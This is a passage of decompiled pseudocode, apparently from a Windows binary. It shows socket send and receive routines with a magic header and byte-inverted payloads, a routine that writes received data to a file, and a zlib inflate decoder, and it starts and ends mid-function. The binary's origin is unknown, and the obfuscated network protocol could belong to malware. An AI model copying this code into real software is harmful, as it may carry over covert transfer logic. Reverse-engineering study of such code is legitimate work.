    *(undefined4 *)((int)piVar3 + 2) = _DAT_00423130;
    *(undefined *)((int)piVar3 + 6) = (undefined)DAT_00423134;
    _memcpy((void *)((int)piVar3 + 7),param_2,unaff_EDI);
    uVar4 = Ordinal_19(*param_1,piVar3,uVar1,0);
    param_1 = piVar3;
    if ((uVar4 != 0xffffffff) && (uVar4 == uVar1)) {
      local_4 = 1;
    }
  }
  if (param_1 != (int *)0x0) {
    _free(param_1);
  }
  return local_4;
}



void __fastcall
FUN_004058e0(undefined2 *param_1,int *param_2,undefined2 param_3,size_t param_4,undefined2 *param_5)

{
  undefined2 *puVar1;
  int iVar2;
  size_t _Size;
  size_t _Size_00;
  undefined4 local_810;
  int *local_80c;
  undefined2 *local_808;
  undefined2 local_804 [1024];
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)&local_810;
  puVar1 = local_804;
  if (param_5 != (undefined2 *)0x0) {
    puVar1 = param_5;
  }
  *puVar1 = 0;
  local_810 = 0;
  local_80c = param_2;
  local_808 = param_1;
  if (*param_2 != 0) {
    if (0xfffa < (int)param_4) {
      param_4 = 0xfffa;
    }
    puVar1 = (undefined2 *)operator_new(0x1000);
    _Size = param_4;
    if (0xffa < (int)param_4) {
      _Size = 0xffa;
    }
    *puVar1 = param_3;
    *(size_t *)(puVar1 + 1) = param_4;
    if ((param_1 == (undefined2 *)0x0) && (param_4 == 0)) {
      iVar2 = FUN_00405840(local_80c,puVar1);
      param_1 = puVar1;
      if (iVar2 != 0) {
        local_810 = 1;
      }
    }
    else {
      _memcpy(puVar1 + 3,param_1,_Size);
      iVar2 = FUN_00405840(local_80c,puVar1);
      param_1 = puVar1;
      if (iVar2 != 0) {
        for (; (int)_Size < (int)param_4; _Size = _Size + _Size_00) {
          _Size_00 = param_4 - _Size;
          if (0x1000 < (int)_Size_00) {
            _Size_00 = 0x1000;
          }
          _memcpy(puVar1,(void *)((int)local_808 + _Size),_Size_00);
          iVar2 = FUN_00405840(local_80c,puVar1);
          if (iVar2 == 0) goto LAB_004059f9;
        }
        local_810 = 1;
      }
    }
  }
LAB_004059f9:
  if (param_1 != (undefined2 *)0x0) {
    _free(param_1);
  }
  ___security_check_cookie_4(local_4 ^ (uint)&local_810);
  return;
}



void __fastcall FUN_00405a30(void *param_1,wchar_t *param_2,int *param_3,size_t *param_4)

{
  wchar_t *_Dst;
  size_t *psVar1;
  int iVar2;
  int iVar3;
  byte *pbVar4;
  int *piVar5;
  size_t sVar6;
  int *piVar7;
  size_t _Size;
  uint uVar8;
  undefined4 local_8e0;
  wchar_t *local_8dc;
  int *piStack_8d8;
  void *local_8d4;
  size_t *local_8d0;
  undefined2 local_8cc;
  wchar_t local_804;
  undefined local_802 [2046];
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)&local_8e0;
  local_8d0 = param_4;
  local_804 = L'\0';
  local_8d4 = param_1;
  _memset(local_802,0,0x7fe);
  local_8dc = &local_804;
  if (param_2 != (wchar_t *)0x0) {
    local_8dc = param_2;
  }
  _Dst = local_8dc;
  *local_8dc = L'\0';
  iVar2 = *param_3;
  local_8e0 = 0;
  if ((iVar2 == 0) || (param_1 == (void *)0x0)) goto LAB_00405c0b;
  local_8cc = local_8cc & 0xff00;
  _memset((void *)((int)&local_8cc + 1),0,199);
  iVar2 = Ordinal_16(iVar2,&local_8cc,2,0);
  if ((iVar2 == -1) || (iVar2 == 0)) {
    _wcscpy_s(_Dst,0x3ff,(wchar_t *)&DAT_0041ded8);
    goto LAB_00405c0b;
  }
  uVar8 = (uint)local_8cc;
  iVar2 = 0;
  piStack_8d8 = (int *)operator_new(uVar8 + 2);
  if (uVar8 != 0) {
    do {
      iVar3 = Ordinal_16(*param_3,iVar2 + (int)piStack_8d8,uVar8 - iVar2,0);
      psVar1 = local_8d0;
      if ((iVar3 == -1) || (iVar3 == 0)) {
        _wcscpy_s(local_8dc,0x3ff,(wchar_t *)&DAT_0041ded8);
        Ordinal_111();
        goto LAB_00405bf6;
      }
      iVar2 = iVar2 + iVar3;
    } while (iVar2 < (int)uVar8);
    if (4 < iVar2) {
      _Size = iVar2 - 5;
      uVar8 = 5;
      piVar7 = (int *)&DAT_00423130;
      piVar5 = piStack_8d8;
      do {
        if (*piVar7 != *piVar5) goto LAB_00405b74;
        uVar8 = uVar8 - 4;
        piVar5 = piVar5 + 1;
        piVar7 = piVar7 + 1;
      } while (3 < uVar8);
      if (uVar8 == 0) {
LAB_00405c24:
        iVar3 = 0;
      }
      else {
LAB_00405b74:
        iVar2 = (uint)*(byte *)piVar7 - (uint)*(byte *)piVar5;
        if (iVar2 == 0) {
          if (uVar8 == 1) goto LAB_00405c24;
          iVar2 = (uint)*(byte *)((int)piVar7 + 1) - (uint)*(byte *)((int)piVar5 + 1);
          if (iVar2 == 0) {
            if (uVar8 == 2) goto LAB_00405c24;
            iVar2 = (uint)*(byte *)((int)piVar7 + 2) - (uint)*(byte *)((int)piVar5 + 2);
            if (iVar2 == 0) {
              if ((uVar8 == 3) ||
                 (iVar2 = (uint)*(byte *)((int)piVar7 + 3) - (uint)*(byte *)((int)piVar5 + 3),
                 iVar2 == 0)) goto LAB_00405c24;
            }
          }
        }
        iVar3 = 1;
        if (iVar2 < 1) {
          iVar3 = -1;
        }
      }
      if (iVar3 == 0) {
        if (0 < (int)_Size) {
          pbVar4 = (byte *)((int)piStack_8d8 + 5);
          sVar6 = _Size;
          do {
            *pbVar4 = ~*pbVar4;
            pbVar4 = pbVar4 + 1;
            sVar6 = sVar6 - 1;
          } while (sVar6 != 0);
        }
        if ((int)*local_8d0 < (int)_Size) {
          _memcpy(local_8d4,(void *)((int)piStack_8d8 + 5),*local_8d0);
          local_8e0 = 1;
        }
        else {
          _memcpy(local_8d4,(void *)((int)piStack_8d8 + 5),_Size);
          *psVar1 = _Size;
          local_8e0 = 1;
        }
      }
      else {
        _wcscpy_s(local_8dc,0x3ff,(wchar_t *)&DAT_0041ded8);
      }
    }
  }
LAB_00405bf6:
  if (piStack_8d8 != (int *)0x0) {
    _free(piStack_8d8);
  }
LAB_00405c0b:
  ___security_check_cookie_4(local_4 ^ (uint)&local_8e0);
  return;
}



void __fastcall
FUN_00405cc0(void *param_1,int *param_2,undefined2 *param_3,size_t *param_4,wchar_t *param_5)

{
  size_t _Size;
  wchar_t *pwVar1;
  undefined2 *_Src;
  int iVar2;
  size_t sVar3;
  size_t sVar4;
  size_t sVar5;
  size_t sVar6;
  size_t local_81c;
  void *local_818;
  undefined2 *local_814;
  undefined4 local_810;
  wchar_t *local_80c;
  int *local_808;
  wchar_t local_804;
  undefined local_802 [2046];
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)&local_81c;
  local_814 = param_3;
  local_804 = L'\0';
  local_818 = param_1;
  local_808 = param_2;
  _memset(local_802,0,0x7fe);
  local_80c = &local_804;
  if (param_5 != (wchar_t *)0x0) {
    local_80c = param_5;
  }
  pwVar1 = local_80c;
  *local_80c = L'\0';
  local_810 = 0;
  if ((*param_2 != 0) && (local_818 != (void *)0x0)) {
    local_81c = 0x1000;
    _Src = (undefined2 *)operator_new(0x1000);
    iVar2 = FUN_00405a30(_Src,pwVar1,local_808,&local_81c);
    sVar4 = local_81c;
    if ((iVar2 != 0) && (sVar3 = local_81c - 6, -1 < (int)sVar3)) {
      *local_814 = *_Src;
      sVar4 = *param_4;
      local_814 = *(undefined2 **)(_Src + 1);
      if ((int)sVar4 < (int)sVar3) {
        sVar6 = 0;
        if (0 < (int)sVar4) {
          _memcpy(local_818,_Src + 3,sVar4);
          sVar6 = *param_4;
        }
      }
      else {
        _memcpy(local_818,_Src + 3,sVar3);
        sVar6 = sVar3;
      }
      sVar5 = sVar6;
      if ((int)sVar3 < (int)local_814) {
        do {
          local_81c = 0x1000;
          iVar2 = FUN_00405a30(_Src,local_80c,local_808,&local_81c);
          _Size = local_81c;
          sVar4 = local_81c;
          if ((iVar2 == 0) || (sVar4 = sVar3 + local_81c, 0x10000 < (int)sVar4)) goto LAB_00405e51;
          sVar3 = *param_4;
          sVar6 = sVar5 + local_81c;
          local_81c = sVar4;
          if ((int)sVar3 < (int)sVar6) {
            sVar6 = sVar5;
            if ((int)sVar5 < (int)sVar3) {
              _memcpy((void *)((int)local_818 + sVar5),_Src,sVar3 - sVar5);
              sVar6 = *param_4;
            }
          }
          else {
            _memcpy((void *)((int)local_818 + sVar5),_Src,_Size);
          }
          sVar3 = local_81c;
          sVar5 = sVar6;
        } while ((int)local_81c < (int)local_814);
      }
      *param_4 = sVar6;
      local_810 = 1;
      sVar4 = local_81c;
    }
LAB_00405e51:
    local_81c = sVar4;
    if (_Src != (undefined2 *)0x0) {
      _free(_Src);
    }
  }
  ___security_check_cookie_4(local_4 ^ (uint)&local_81c);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00405e80(undefined4 param_1)

{
  int iVar1;
  size_t _Count;
  undefined4 *unaff_EBX;
  uint uVar2;
  uint uStack_101c;
  FILE **ppFStack_1018;
  undefined local_100c [4];
  undefined4 local_1008;
  uint uStack_14;
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)local_100c;
  uVar2 = 0;
  ppFStack_1018 = (FILE **)0x0;
  uStack_101c = 4;
  local_1008 = param_1;
  iVar1 = Ordinal_16(*unaff_EBX,local_100c);
  if (iVar1 != 4) {
    ___security_check_cookie_4(uStack_14 ^ (uint)&uStack_101c);
    return;
  }
  if (uStack_101c != 0) {
    do {
      _Count = Ordinal_16(*unaff_EBX,&stack0xffffefec,0x1000,0);
      if (_Count == 0) break;
      _fwrite(&stack0xffffefec,1,_Count,*ppFStack_1018);
      uVar2 = uVar2 + _Count;
      _DAT_00424784 = uVar2;
    } while (uVar2 < uStack_101c);
  }
  _fclose(*ppFStack_1018);
  ___security_check_cookie_4(uStack_14 ^ (uint)&uStack_101c);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_00405f50(undefined4 param_1,void **param_2,undefined4 param_3,void *param_4)

{
  int *piVar1;
  int iVar2;
  int *_Memory;
  undefined auStack_244 [4];
  void **local_240;
  int local_23c;
  undefined2 local_238;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 local_14;
  void *local_10;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)auStack_244;
  local_240 = param_2;
  _Memory = FUN_0040a210(param_3,param_1);
  if (_Memory != (int *)0x0) {
    if (*_Memory == 1) {
      piVar1 = (int *)_Memory[1];
      if (*(uint *)(*piVar1 + 4) < 0x80000000) {
        if (piVar1[1] != -1) {
          FUN_00409890();
          param_2 = local_240;
        }
        piVar1[1] = -1;
        local_30 = 0;
        local_2c = 0;
        local_28 = 0;
        local_24 = 0;
        local_20 = 0;
        local_1c = 0;
        local_18 = 0;
        local_14 = 0;
        _DAT_004253c0 = 0;
      }
      else {
        _DAT_004253c0 = 0x10000;
      }
    }
    else {
      _DAT_004253c0 = 0x80000;
    }
    local_23c = 0;
    local_238 = 0;
    local_10 = (void *)0x0;
    if (*_Memory == 1) {
      _DAT_004253c0 = FUN_00409ab0((void *)_Memory[1],0,&local_23c);
    }
    else {
      _DAT_004253c0 = 0x80000;
    }
    if (*_Memory == 1) {
      _DAT_004253c0 = FUN_0040a050(param_4,*param_2);
    }
    else {
      _DAT_004253c0 = 0x80000;
    }
    *param_2 = local_10;
    if (*_Memory == 1) {
      iVar2 = _Memory[1];
      _DAT_004253c0 = FUN_0040a1b0();
      if (iVar2 != 0) {
        FUN_0040a2c0();
      }
      _free(_Memory);
    }
    else {
      _DAT_004253c0 = 0x80000;
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)auStack_244);
  return;
}



int __cdecl FUN_004060c0(int param_1)

{
  uint uVar1;
  undefined4 uVar2;
  int unaff_EBX;
  void *_Src;
  int unaff_ESI;
  void *pvVar3;
  uint uVar4;
  void *local_4;
  
  local_4 = *(void **)(unaff_EBX + 0xc);
  _Src = *(void **)(unaff_ESI + 0x30);
  pvVar3 = *(void **)(unaff_ESI + 0x34);
  if (pvVar3 < _Src) {
    pvVar3 = *(void **)(unaff_ESI + 0x2c);
  }
  uVar1 = *(uint *)(unaff_EBX + 0x10);
  uVar4 = (int)pvVar3 - (int)_Src;
  if (uVar1 < (uint)((int)pvVar3 - (int)_Src)) {
    uVar4 = uVar1;
  }
  if ((uVar4 != 0) && (param_1 == -5)) {
    param_1 = 0;
  }
  *(int *)(unaff_EBX + 0x14) = *(int *)(unaff_EBX + 0x14) + uVar4;
  *(uint *)(unaff_EBX + 0x10) = uVar1 - uVar4;
  if (*(code **)(unaff_ESI + 0x38) != (code *)0x0) {
    uVar2 = (**(code **)(unaff_ESI + 0x38))(*(undefined4 *)(unaff_ESI + 0x3c),_Src,uVar4);
    *(undefined4 *)(unaff_ESI + 0x3c) = uVar2;
    *(undefined4 *)(unaff_EBX + 0x30) = uVar2;
  }
  if (uVar4 != 0) {
    _memcpy(local_4,_Src,uVar4);
    local_4 = (void *)((int)local_4 + uVar4);
    _Src = (void *)((int)_Src + uVar4);
  }
  if (_Src == *(void **)(unaff_ESI + 0x2c)) {
    _Src = *(void **)(unaff_ESI + 0x28);
    if (*(void **)(unaff_ESI + 0x34) == *(void **)(unaff_ESI + 0x2c)) {
      *(void **)(unaff_ESI + 0x34) = _Src;
    }
    uVar1 = *(uint *)(unaff_EBX + 0x10);
    uVar4 = *(int *)(unaff_ESI + 0x34) - (int)_Src;
    if (uVar1 < uVar4) {
      uVar4 = uVar1;
    }
    if ((uVar4 != 0) && (param_1 == -5)) {
      param_1 = 0;
    }
    *(int *)(unaff_EBX + 0x14) = *(int *)(unaff_EBX + 0x14) + uVar4;
    *(uint *)(unaff_EBX + 0x10) = uVar1 - uVar4;
    if (*(code **)(unaff_ESI + 0x38) != (code *)0x0) {
      uVar2 = (**(code **)(unaff_ESI + 0x38))(*(undefined4 *)(unaff_ESI + 0x3c),_Src,uVar4);
      *(undefined4 *)(unaff_ESI + 0x3c) = uVar2;
      *(undefined4 *)(unaff_EBX + 0x30) = uVar2;
    }
    if (uVar4 != 0) {
      _memcpy(local_4,_Src,uVar4);
      local_4 = (void *)((int)local_4 + uVar4);
      _Src = (void *)((int)_Src + uVar4);
    }
  }
  *(void **)(unaff_EBX + 0xc) = local_4;
  *(void **)(unaff_ESI + 0x30) = _Src;
  return param_1;
}



void __cdecl FUN_004061b0(undefined param_1,undefined param_2,undefined4 param_3,undefined4 param_4)

{
  int in_EAX;
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)(**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),1,0x1c);
  if (puVar1 != (undefined4 *)0x0) {
    *(undefined *)(puVar1 + 4) = param_1;
    *(undefined *)((int)puVar1 + 0x11) = param_2;
    *puVar1 = 0;
    puVar1[5] = param_3;
    puVar1[6] = param_4;
  }
  return;
}



void __thiscall FUN_004061f0(void *this,int param_1)

{
  byte bVar1;
  uint *puVar2;
  undefined *puVar3;
  byte **in_EAX;
  uint uVar4;
  undefined *puVar5;
  undefined *puVar6;
  byte *pbVar7;
  uint uVar8;
  uint local_1c;
  byte *local_14;
  undefined *local_10;
  byte *local_c;
  undefined *local_8;
  
  local_1c = *(uint *)((int)this + 0x20);
  puVar2 = *(uint **)((int)this + 4);
  local_14 = in_EAX[1];
  pbVar7 = *in_EAX;
  puVar6 = *(undefined **)((int)this + 0x34);
  uVar8 = *(uint *)((int)this + 0x1c);
  if (puVar6 < *(undefined **)((int)this + 0x30)) {
    local_10 = *(undefined **)((int)this + 0x30) + (-1 - (int)puVar6);
  }
  else {
    local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar6);
  }
  uVar4 = *puVar2;
  while (uVar4 < 10) {
    puVar5 = puVar6;
    switch(uVar4) {
    case 0:
      if ((local_10 < (undefined *)0x102) || (local_14 < (byte *)0xa)) {
LAB_004062ea:
        puVar2[3] = (uint)*(byte *)(puVar2 + 4);
        puVar2[2] = puVar2[5];
        *puVar2 = 1;
        goto switchD_00406240_caseD_1;
      }
      *(uint *)((int)this + 0x20) = local_1c;
      *(uint *)((int)this + 0x1c) = uVar8;
      in_EAX[1] = local_14;
      in_EAX[2] = in_EAX[2] + ((int)pbVar7 - (int)*in_EAX);
      *in_EAX = pbVar7;
      *(undefined **)((int)this + 0x34) = puVar6;
      param_1 = FUN_00407b60((uint)*(byte *)(puVar2 + 4),(uint)*(byte *)((int)puVar2 + 0x11),
                             puVar2[5],puVar2[6],(int)this,in_EAX);
      local_14 = in_EAX[1];
      local_1c = *(uint *)((int)this + 0x20);
      pbVar7 = *in_EAX;
      uVar8 = *(uint *)((int)this + 0x1c);
      puVar6 = *(undefined **)((int)this + 0x34);
      if (puVar6 < *(undefined **)((int)this + 0x30)) {
        local_10 = *(undefined **)((int)this + 0x30) + (-1 - (int)puVar6);
      }
      else {
        local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar6);
      }
      if (param_1 == 0) goto LAB_004062ea;
      *puVar2 = (uint)(param_1 != 1) * 2 + 7;
      goto LAB_0040674a;
    case 1:
switchD_00406240_caseD_1:
      for (; uVar8 < puVar2[3]; uVar8 = uVar8 + 8) {
        if (local_14 == (byte *)0x0) {
LAB_00406788:
          *(uint *)((int)this + 0x20) = local_1c;
          *(uint *)((int)this + 0x1c) = uVar8;
          in_EAX[1] = (byte *)0x0;
          in_EAX[2] = in_EAX[2] + ((int)pbVar7 - (int)*in_EAX);
          *in_EAX = pbVar7;
          *(undefined **)((int)this + 0x34) = puVar6;
          FUN_004060c0(param_1);
          return;
        }
        bVar1 = *pbVar7;
        local_14 = local_14 + -1;
        pbVar7 = pbVar7 + 1;
        param_1 = 0;
        local_1c = local_1c | (uint)bVar1 << ((byte)uVar8 & 0x1f);
      }
      local_c = (byte *)(puVar2[2] + (*(uint *)(&DAT_0041e580 + puVar2[3] * 4) & local_1c) * 8);
      local_1c = local_1c >> (local_c[1] & 0x1f);
      uVar8 = uVar8 - local_c[1];
      bVar1 = *local_c;
      uVar4 = (uint)bVar1;
      if (uVar4 == 0) {
        puVar2[2] = *(uint *)(local_c + 4);
        *puVar2 = 6;
        goto LAB_0040674a;
      }
      if ((bVar1 & 0x10) != 0) {
        puVar2[2] = uVar4 & 0xf;
        puVar2[1] = *(uint *)(local_c + 4);
        *puVar2 = 2;
        goto LAB_0040674a;
      }
      if ((bVar1 & 0x40) == 0) goto LAB_004063b6;
      if ((bVar1 & 0x20) != 0) {
        *puVar2 = 7;
        goto LAB_0040674a;
      }
      *puVar2 = 9;
      in_EAX[6] = (byte *)s_invalid_literal_length_code_0041fd64;
      param_1 = -3;
      goto LAB_0040675b;
    case 2:
      uVar4 = puVar2[2];
      for (; uVar8 < uVar4; uVar8 = uVar8 + 8) {
        if (local_14 == (byte *)0x0) goto LAB_00406788;
        bVar1 = *pbVar7;
        local_14 = local_14 + -1;
        pbVar7 = pbVar7 + 1;
        param_1 = 0;
        local_1c = local_1c | (uint)bVar1 << ((byte)uVar8 & 0x1f);
      }
      puVar2[1] = puVar2[1] + (*(uint *)(&DAT_0041e580 + uVar4 * 4) & local_1c);
      local_1c = local_1c >> ((byte)uVar4 & 0x1f);
      uVar8 = uVar8 - uVar4;
      puVar2[3] = (uint)*(byte *)((int)puVar2 + 0x11);
      puVar2[2] = puVar2[6];
      *puVar2 = 3;
      break;
    case 3:
      break;
    case 4:
      uVar4 = puVar2[2];
      for (; uVar8 < uVar4; uVar8 = uVar8 + 8) {
        if (local_14 == (byte *)0x0) goto LAB_00406788;
        bVar1 = *pbVar7;
        local_14 = local_14 + -1;
        pbVar7 = pbVar7 + 1;
        param_1 = 0;
        local_1c = local_1c | (uint)bVar1 << ((byte)uVar8 & 0x1f);
      }
      puVar2[3] = puVar2[3] + (*(uint *)(&DAT_0041e580 + uVar4 * 4) & local_1c);
      local_1c = local_1c >> ((byte)uVar4 & 0x1f);
      uVar8 = uVar8 - uVar4;
      *puVar2 = 5;
    case 5:
      local_8 = puVar6 + -puVar2[3];
      if (local_8 < *(undefined **)((int)this + 0x28)) {
        do {
          local_8 = local_8 + (*(int *)((int)this + 0x2c) - (int)*(undefined **)((int)this + 0x28));
        } while (local_8 < *(undefined **)((int)this + 0x28));
      }
      uVar4 = puVar2[1];
      while (uVar4 != 0) {
        puVar5 = puVar6;
        if (local_10 == (undefined *)0x0) {
          if (puVar6 == *(undefined **)((int)this + 0x2c)) {
            local_10 = *(undefined **)((int)this + 0x30);
            puVar5 = *(undefined **)((int)this + 0x28);
            if (local_10 != puVar5) {
              if (puVar5 < local_10) {
                local_10 = local_10 + (-1 - (int)puVar5);
              }
              else {
                local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar5);
              }
              puVar6 = puVar5;
              if (local_10 != (undefined *)0x0) goto LAB_0040664f;
            }
          }
          *(undefined **)((int)this + 0x34) = puVar6;
          param_1 = FUN_004060c0(param_1);
          puVar5 = *(undefined **)((int)this + 0x34);
          if (puVar5 < *(undefined **)((int)this + 0x30)) {
            local_10 = *(undefined **)((int)this + 0x30) + (-1 - (int)puVar5);
          }
          else {
            local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar5);
          }
          if (puVar5 == *(undefined **)((int)this + 0x2c)) {
            puVar6 = *(undefined **)((int)this + 0x28);
            puVar3 = *(undefined **)((int)this + 0x30);
            if (puVar3 != puVar6) {
              puVar5 = puVar6;
              if (puVar6 < puVar3) {
                local_10 = puVar3 + (-1 - (int)puVar6);
              }
              else {
                local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar6);
              }
            }
          }
          if (local_10 == (undefined *)0x0) goto LAB_004067cb;
        }
LAB_0040664f:
        *puVar5 = *local_8;
        local_8 = local_8 + 1;
        local_10 = local_10 + -1;
        puVar6 = puVar5 + 1;
        param_1 = 0;
        if (local_8 == *(undefined **)((int)this + 0x2c)) {
          local_8 = *(undefined **)((int)this + 0x28);
        }
        puVar2[1] = puVar2[1] - 1;
        uVar4 = puVar2[1];
      }
LAB_00406744:
      *puVar2 = 0;
      goto LAB_0040674a;
    case 6:
      if (local_10 == (undefined *)0x0) {
        if (puVar6 == *(undefined **)((int)this + 0x2c)) {
          local_10 = *(undefined **)((int)this + 0x30);
          puVar5 = *(undefined **)((int)this + 0x28);
          if (local_10 != puVar5) {
            if (puVar5 < local_10) {
              local_10 = local_10 + (-1 - (int)puVar5);
            }
            else {
              local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar5);
            }
            puVar6 = puVar5;
            if (local_10 != (undefined *)0x0) goto LAB_00406725;
          }
        }
        *(undefined **)((int)this + 0x34) = puVar6;
        param_1 = FUN_004060c0(param_1);
        puVar5 = *(undefined **)((int)this + 0x34);
        if (puVar5 < *(undefined **)((int)this + 0x30)) {
          local_10 = *(undefined **)((int)this + 0x30) + (-1 - (int)puVar5);
        }
        else {
          local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar5);
        }
        if (puVar5 == *(undefined **)((int)this + 0x2c)) {
          puVar6 = *(undefined **)((int)this + 0x28);
          puVar3 = *(undefined **)((int)this + 0x30);
          if (puVar3 != puVar6) {
            puVar5 = puVar6;
            if (puVar6 < puVar3) {
              local_10 = puVar3 + (-1 - (int)puVar6);
            }
            else {
              local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar6);
            }
          }
        }
        if (local_10 == (undefined *)0x0) {
LAB_004067cb:
          *(uint *)((int)this + 0x20) = local_1c;
          *(uint *)((int)this + 0x1c) = uVar8;
          in_EAX[1] = local_14;
          in_EAX[2] = in_EAX[2] + ((int)pbVar7 - (int)*in_EAX);
          goto LAB_00406773;
        }
      }
LAB_00406725:
      *puVar5 = *(undefined *)(puVar2 + 2);
      puVar6 = puVar5 + 1;
      local_10 = local_10 + -1;
      param_1 = 0;
      goto LAB_00406744;
    case 7:
      if (7 < uVar8) {
        local_14 = local_14 + 1;
        uVar8 = uVar8 - 8;
        pbVar7 = pbVar7 + -1;
      }
      *(undefined **)((int)this + 0x34) = puVar6;
      param_1 = FUN_004060c0(param_1);
      puVar6 = *(undefined **)((int)this + 0x34);
      if (*(undefined **)((int)this + 0x30) == puVar6) {
        *puVar2 = 8;
        goto switchD_00406240_caseD_8;
      }
      *(uint *)((int)this + 0x20) = local_1c;
      *(uint *)((int)this + 0x1c) = uVar8;
      in_EAX[1] = local_14;
      goto LAB_0040676c;
    case 8:
switchD_00406240_caseD_8:
      param_1 = 1;
      goto LAB_0040675b;
    case 9:
      *(uint *)((int)this + 0x20) = local_1c;
      *(uint *)((int)this + 0x1c) = uVar8;
      in_EAX[1] = local_14;
      in_EAX[2] = in_EAX[2] + ((int)pbVar7 - (int)*in_EAX);
      param_1 = -3;
      goto LAB_00406773;
    }
    for (; uVar8 < puVar2[3]; uVar8 = uVar8 + 8) {
      if (local_14 == (byte *)0x0) goto LAB_00406788;
      bVar1 = *pbVar7;
      local_14 = local_14 + -1;
      pbVar7 = pbVar7 + 1;
      param_1 = 0;
      local_1c = local_1c | (uint)bVar1 << ((byte)uVar8 & 0x1f);
    }
    local_c = (byte *)(puVar2[2] + (*(uint *)(&DAT_0041e580 + puVar2[3] * 4) & local_1c) * 8);
    local_1c = local_1c >> (local_c[1] & 0x1f);
    bVar1 = *local_c;
    uVar4 = (uint)bVar1;
    uVar8 = uVar8 - local_c[1];
    if ((bVar1 & 0x10) == 0) {
      if ((bVar1 & 0x40) != 0) {
        *puVar2 = 9;
        in_EAX[6] = (byte *)s_invalid_distance_code_0041fd80;
        param_1 = -3;
        goto LAB_0040675b;
      }
LAB_004063b6:
      puVar2[3] = uVar4;
      puVar2[2] = (uint)(local_c + *(int *)(local_c + 4) * 8);
    }
    else {
      puVar2[2] = uVar4 & 0xf;
      puVar2[3] = *(uint *)(local_c + 4);
      *puVar2 = 4;
    }
LAB_0040674a:
    uVar4 = *puVar2;
  }
  param_1 = -2;
LAB_0040675b:
  *(uint *)((int)this + 0x20) = local_1c;
  *(uint *)((int)this + 0x1c) = uVar8;
  in_EAX[1] = local_14;
LAB_0040676c:
  in_EAX[2] = in_EAX[2] + ((int)pbVar7 - (int)*in_EAX);
  puVar5 = puVar6;
LAB_00406773:
  *in_EAX = pbVar7;
  *(undefined **)((int)this + 0x34) = puVar5;
  FUN_004060c0(param_1);
  return;
}



void FUN_00406890(void)

{
  int *in_EAX;
  int iVar1;
  int *unaff_ESI;
  int unaff_EDI;
  
  if (in_EAX != (int *)0x0) {
    *in_EAX = unaff_ESI[0xf];
  }
  if ((*unaff_ESI == 4) || (*unaff_ESI == 5)) {
    (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[3]);
  }
  if (*unaff_ESI == 6) {
    (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[1]);
  }
  unaff_ESI[0xd] = unaff_ESI[10];
  unaff_ESI[0xc] = unaff_ESI[10];
  *unaff_ESI = 0;
  unaff_ESI[7] = 0;
  unaff_ESI[8] = 0;
  if ((code *)unaff_ESI[0xe] != (code *)0x0) {
    iVar1 = (*(code *)unaff_ESI[0xe])(0,0,0);
    unaff_ESI[0xf] = iVar1;
    *(int *)(unaff_EDI + 0x30) = iVar1;
  }
  return;
}



undefined4 * __cdecl FUN_00406900(undefined4 param_1)

{
  int in_EAX;
  undefined4 *puVar1;
  int iVar2;
  int unaff_EBX;
  
  puVar1 = (undefined4 *)(**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),1,0x40);
  if (puVar1 != (undefined4 *)0x0) {
    iVar2 = (**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),8,0x5a0);
    puVar1[9] = iVar2;
    if (iVar2 != 0) {
      iVar2 = (**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),1);
      puVar1[10] = iVar2;
      if (iVar2 == 0) {
        (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),puVar1[9]);
        (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),puVar1);
        return (undefined4 *)0x0;
      }
      puVar1[0xb] = iVar2 + unaff_EBX;
      puVar1[0xe] = param_1;
      *puVar1 = 0;
      FUN_00406890();
      return puVar1;
    }
    (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),puVar1);
  }
  return (undefined4 *)0x0;
}



// WARNING: Type propagation algorithm not settling

void __thiscall FUN_004069a0(void *this,int param_1)

{
  int *piVar1;
  byte bVar2;
  byte *pbVar3;
  byte *pbVar4;
  byte **in_EAX;
  uint uVar5;
  uint uVar6;
  undefined4 uVar7;
  undefined4 *puVar8;
  int iVar9;
  byte bVar10;
  uint uVar11;
  byte *_Src;
  uint uVar12;
  uint local_28;
  byte *local_24;
  byte *local_20;
  byte *local_1c;
  byte *local_18;
  int local_14;
  uint local_10;
  uint local_c;
  int local_8;
  int local_4;
  
  pbVar3 = *(byte **)((int)this + 0x34);
  local_20 = in_EAX[1];
  _Src = *in_EAX;
  uVar12 = *(uint *)((int)this + 0x1c);
  if (pbVar3 < *(byte **)((int)this + 0x30)) {
    local_18 = *(byte **)((int)this + 0x30) + (-1 - (int)pbVar3);
  }
  else {
    local_18 = (byte *)(*(int *)((int)this + 0x2c) - (int)pbVar3);
  }
                    // WARNING: Load size is inaccurate
  uVar11 = *this;
  uVar6 = *(uint *)((int)this + 0x20);
  uVar5 = *(uint *)((int)this + 0x20);
  do {
    local_28 = uVar5;
